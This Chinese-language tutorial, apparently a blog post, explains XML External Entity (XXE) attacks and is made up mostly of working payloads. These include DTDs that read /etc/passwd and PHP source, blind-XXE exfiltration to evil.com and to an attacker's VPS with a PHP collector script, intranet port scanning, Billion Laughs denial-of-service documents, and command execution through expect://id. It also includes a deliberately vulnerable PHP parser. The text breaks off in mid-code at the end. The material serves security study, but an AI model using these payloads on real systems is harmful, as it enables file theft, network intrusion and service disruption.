<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///path/to/file.ext</span>
http<span class="token punctuation">:</span><span class="token comment">//url/file.ext</span>
php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=conf.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>不同程序支持的协议不同<br><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234009565-2028886204.gif" alt="QQ图片20170423182304.png"></p>
<h2 id="1-任意文件读取-1"><a href="#1-任意文件读取-1" class="headerlink" title="1.任意文件读取"></a>1.任意文件读取</h2><p>任意读取的代码:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
  &lt;!ELEMENT methodname ANY &gt;
  &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;
&lt;methodcall&gt;
  &lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>1).有直接回显的情况:可以看命名实体写法，根据实际情况替换相应代码利用即可，我本地测试照搬过来<br><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010016-1338276588.gif" alt="QQ图片20170423173040.png"><br>2).无回显的情况：可以看第一种命名实体+外部实体+参数实体写法和第二种命名实体+外部实体+参数实体写法<br>第一种写法结果如图：<img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010420-1047795442.gif" alt="QQ图片20170423173934.png"><br>c://test/1.txt文件内容为111111111，可以从apache的日志中看到</p>
<pre class="line-numbers language-none"><code class="language-none">::1 - - [23&#x2F;Apr&#x2F;2017:17:37:13 +0800] &quot;GET &#x2F;111111111 HTTP&#x2F;1.0&quot; 404 207<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果把<a target="_blank" rel="noopener" href="http://localhost:88/evil.xml替换为一个远程服务器的xml文件地址，即可在日志中看到我们想要获取的数据">http://localhost:88/evil.xml替换为一个远程服务器的xml文件地址，即可在日志中看到我们想要获取的数据</a></p>
<p>第二种写法结果如图：<br><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234010808-912600799.gif" alt="QQ图片20170423174639.png"></p>
<p>本地环境读取:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234011163-155414255.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234011719-786727724.gif" alt="img"></p>
<p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>另外，数据不回显就没有问题了吗？如下图，</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012120-420916652.gif" alt="img"></p>
<p>不，可以把数据发送到远程服务器，</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012611-13895427.gif" alt="img"></p>
<p>远程evil.dtd文件内容如下：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234012895-1129528672.gif" alt="img"></p>
<p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234013408-983490916.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234013807-271963911.gif" alt="img"></p>
<p>基于file协议的XXE攻击</p>
<p>XMLInject.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    \<span class="token comment"># Enable the ability to load external entities</span>
    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    \<span class="token comment"># http://hublog.hubmed.org/archives/001854.html</span>
    \<span class="token comment"># LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值</span>
    \<span class="token comment"># LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件</span>

    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this stuff is required to make sure</span>

    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">pass</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You have logged in as user <span class="token interpolation"><span class="token variable">$user</span></span>"</span><span class="token punctuation">;</span>`
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>file_get_content(‘php://input’)接收post数据，xml数据<br>XML.txt</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;
]&gt;
&lt;creds&gt;
    &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;
    &lt;pass&gt;mypass&lt;&#x2F;pass&gt;
&lt;&#x2F;creds&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>导致可以读出etc/passwd文件<br>在使用file://协议时，有以下几种格式：</p>
<p>file：//host/path</p>
<p>* Linux</p>
<p> file:///etc/passwd</p>
<p>*  Unix</p>
<p> file://localhost/etc/fstab</p>
<p> file:///localhost/etc/fstab</p>
<p>*  Windows</p>
<p> file:///c:/windows/win.ini</p>
<p> file://localhost/c:/windows/win.ini</p>
<p>* （下面这两种在某些浏览器里是支持的）</p>
<p> file:///c|windows/win.ini</p>
<p> file://localhost/c|windows/win.ini</p>
<p>XML文档是用PHP进行解析的，那么还可以使用php://filter协议来进行读取。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY content SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;c:&#x2F;windows&#x2F;win.ini&quot;&gt;
]&gt;
&lt;root&gt;&lt;foo&gt;&amp;content;&lt;&#x2F;foo&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>基于netdoc的XXE攻击</p>
<p>==XML文档是用Java解析的话，可利用netdoc</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
&lt;!DOCTYPE data [
&lt;!ELEMENT data (#PCDATA)&gt;
&lt;!ENTITY file SYSTEM &quot;netdoc:&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;
]&gt;
&lt;data&gt;&amp;file;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>读取本地文件：</p>
<p>以php环境为例，index.php内容如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取h盘里的sky.txt。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;h:&#x2F;&#x2F;sky.txt&quot;&gt;]&gt;
&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>将上述xml进行url编码后传进去，可以发现读取了sky.txt中的内容。</p>
<p>注：</p>
<p>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
	&lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php&quot;&gt;
]&gt;
&lt;root&gt;&amp;file;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>同样先经过url编码后再传入。</p>
<h2 id="2-内网信息探测"><a href="#2-内网信息探测" class="headerlink" title="2.内网信息探测"></a>2.内网信息探测</h2><p>借助各种协议如http,XXE可以协助扫描内网,可能可以访问到内网开放WEB服务的Server,并获取其他信息</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234014187-1408086040.jpg" alt="img"></p>
<p>利用http协议<a target="_blank" rel="noopener" href="http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果，例如我87关闭，88端口有web服务,有的没有明显的连接错误信息，所以无法判断端口的状态">http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果，例如我87关闭，88端口有web服务,有的没有明显的连接错误信息，所以无法判断端口的状态</a><br><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234014565-1239811992.gif" alt="QQ图片20170423175713.png"><br><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015041-2063598645.gif" alt="QQ图片20170423175726.png"> 也可以探测内网端口:</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015397-734831734.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234015905-1773186333.gif" alt="img"></p>
<p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p>
<p>加载外部DTD时有两种加载方式，一种为私有private，第二种为公共public。</p>
<p>私有类型DTD加载：</p>
<p><code>&lt;!ENTITY private_dtd SYSTEM &quot;DTD_location&quot;&gt;</code></p>
<p>公共类型DTD加载：</p>
<p><code>&lt;!ENTITY public_dtd PUBLIC &quot;DTD_name&quot; &quot;DTD_location&quot;&gt;</code></p>
<p>在公共类型DTD加载的时候，首先会使用DTD_name来检索，如果无法找到，则通过DTD_location来寻找此公共DTD。利用DTD_location，在一定的环境下可以用来做内网探测。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
   &lt;!ENTITY portscan SYSTEM &quot;http:&#x2F;&#x2F;localhost:3389&quot;&gt;
]&gt;
&lt;root&gt;&lt;foo&gt;&amp;portscan;&lt;&#x2F;foo&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>因解析器种类不同，所以针对XXE攻击进行端口扫描需要一个合适的环境才能够实现，例如：有明显的连接错误信息。</p>
<p>利用DTD进行数据回显</p>
<p>有时读取文件时没有回显，这时可以利用DTD参数实体的特性将文件内容拼接到url中，达到读取文件的效果。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root[
    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;fileter&#x2F;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;windows&#x2F;win.ini&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.100:8000&#x2F;evil.dtd&quot;&gt;
    %dtd;
    %send;
]&gt;
&lt;root&gt;
&lt;&#x2F;root&gt;

&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;evil.com&#x2F;?content&#x3D;%file;&#39;&gt;&quot;&gt; 
%payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>evil.dtd</p>
<p>在evil.dtd中将%file实体的内容拼接到url后，然后利用burp等工具，查看url请求就能获得我们需要的内容</p>
<p>或者：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
    &lt;!ELEMENT name ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&quot; &gt;
]&gt;
&lt;root&gt;
	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="3-DOS攻击"><a href="#3-DOS攻击" class="headerlink" title="3.DOS攻击"></a>3.DOS攻击</h2><p>最典型的案例Billion Laughs 攻击，Billion laughs attack，xml解析的时候，<lolz></lolz>中间将是一个十亿级别大小的参数，将会消耗掉系统30亿字节的内存。</p>
<p>POC:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
    &lt;!ENTITY lol &quot;lol&quot;&gt;
    &lt;!ELEMENT lolz (#PCDATA)&gt;
    &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
    &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;
    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
    &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
    &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE data [
    &lt;!ENTITY a0 &quot;dos&quot; &gt;
    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
    &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
    &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>POC中中先定义了lol实体，值为”lol”的字符串,后在下面又定义了lol2实体，lol2实体引用10个lol实体，lol3又引用了10个lol2实体的值，依此类推，到了最后在lolz元素中引用的lol9中，就会存在上亿个”lol”字符串</p>
<p>此时解析数据时未做特别处理，即可能造成拒绝服务攻击。</p>
<p>此外还有一种可能造成拒绝服务的Payload,借助读取/dev/random实现.</p>
<h2 id="4-远程命令执行"><a href="#4-远程命令执行" class="headerlink" title="4.远程命令执行"></a>4.远程命令执行</h2><p>PHP下需要expect扩展</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234016597-408254317.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234016907-1385955048.gif" alt="img"></p>
<p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY content SYSTEM &quot;expect:&#x2F;&#x2F;dir .&quot;&gt;
]&gt;
&lt;root&gt;&lt;foo&gt;&amp;content;&lt;&#x2F;foo&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
    &lt;!ELEMENT name ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;expect:&#x2F;&#x2F;id&quot; &gt;
]&gt;
&lt;root&gt;
	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>bind xxe</p>
<p>对于无回显的xml注入:</p>
<p>在你的vps上放1.xml文件，内容如下:</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % f SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
&lt;!ENTITY % all "&lt;!ENTITY % s SYSTEM 'http://你的vps/xxe.php?f=%f;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>再在你的vps上放xxe.php，内容如下:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/tmp/1.txt"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>最后在可以写xml的页面写如下:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE ANY[
    &lt;!ENTITY % r SYSTEM &quot;http:&#x2F;&#x2F;你的vps&#x2F;1.xml&quot;&gt;
    %r;
    %all;
    %s;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问1.txt就可以获得flag的内容</p>
<h2 id="5-攻击内网网站"><a href="#5-攻击内网网站" class="headerlink" title="5.攻击内网网站"></a>5.攻击内网网站</h2><p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234017645-1844719558.gif" alt="img"></p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234017931-1052519331.gif" alt="img"></p>
<p>该CASE是攻击内网struts2网站，远程执行系统命令。</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY exp SYSTEM &quot;http:&#x2F;&#x2F;192.168.1.103&#x2F;payload&quot;&gt;
]&gt;
&lt;root&gt;&lt;foo&gt;&amp;exp;&lt;&#x2F;foo&gt;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xxe [
    &lt;!ELEMENT name ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:80&#x2F;payload&quot; &gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
    &lt;!ELEMENT methodname ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;attacker.com&#x2F;text.txt&quot; &gt;
]&gt;
&lt;methodcall&gt;
    &lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果包含文件失败,可能是由于读取php等文件时文件本身包含的&lt;等字符.可以使用Base64编码绕过,如:</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE xdsec [
    &lt;!ELEMENT methodname ANY &gt;
    &lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php&quot; &gt;
]&gt;
&lt;methodcall&gt;
    &lt;methodname&gt;&amp;xxe;&lt;&#x2F;methodname&gt;
&lt;&#x2F;methodcall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用外部实体构造payload向内网其他机器发出请求</p>
<h1 id="攻击分类"><a href="#攻击分类" class="headerlink" title="攻击分类"></a>攻击分类</h1><h2 id="1-拒绝服务攻击-DDoS"><a href="#1-拒绝服务攻击-DDoS" class="headerlink" title="1.拒绝服务攻击(DDoS)"></a>1.拒绝服务攻击(DDoS)</h2><p>支持实体测试：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE data [
    &lt;!ELEMENT data (#ANY)&gt;
    &lt;!ENTITY a0 &quot;dos&quot; &gt;
    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a2;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</p>
<p>Billion Laughs 攻击 (Klein, 2002)</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">译者注：“Billion Laughs” 攻击 —— 通过创建一项递归的 XML 定义，在内存中生成十亿个“Ha！”字符串，从而导致DDoS 攻击。原理为：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中。
&lt;!DOCTYPE data [
    &lt;!ENTITY a0 &quot;dos&quot; &gt;
    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
    &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
    &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个文件只有 30 Kb大小但却有 11111 个实体引用，超出了合法的实体引用数量上限。</p>
<p>Billion Laughs 攻击 – 参数实体 (Späth, 2015)</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;dos_indirections_parameterEntity_wfc.dtd&quot; [
    &lt;!ELEMENT data (#PCDATA)&gt;
]&gt;
&lt;data&gt;&amp;g;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>文件位于：<a target="_blank" rel="noopener" href="http://publicserver.com/dos.dtd">http://publicServer.com/dos.dtd</a></p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % a0 &quot;dos&quot; &gt;
